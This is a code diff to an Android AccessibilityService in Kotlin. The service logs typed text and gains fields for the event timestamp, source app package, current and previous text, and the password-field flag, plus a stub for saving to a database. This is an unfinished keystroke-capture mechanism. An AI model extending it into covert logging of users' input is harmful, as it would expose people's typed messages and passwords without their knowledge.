@@ -26,11 +26,20 @@ class MyAccessibilityService : AccessibilityService() {
              * **/
             Log.d("AccesKeyboard", "New text: " + event.text)
             Log.d("AccesKeyboard", "Before text: " + event.beforeText)
+            var timestamp = event.eventTime
+            var packageName = event.packageName
+            var txt = event.text
+            var beforeText = event.beforeText
+            var isPassword = event.isPassword
         }
     }
 
     fun getInfo(context: Context, key: String) {
         TODO("Get info on keyboard click, whether it is a new character or not, return boolean")
+    }
+
+    fun saveToDatabase() {
+        TODO("Save to database")
     }
 
 
